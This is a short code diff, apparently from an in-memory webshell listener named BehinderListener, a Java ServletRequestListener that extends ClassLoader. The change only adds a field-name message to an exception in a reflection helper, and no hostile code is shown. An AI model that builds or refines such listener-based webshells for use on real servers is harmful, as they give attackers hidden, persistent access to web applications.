@@ -77,7 +77,7 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
                 clazz = clazz.getSuperclass();
             }
         }
-        throw new NoSuchFieldException();
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 
     @SuppressWarnings("all")
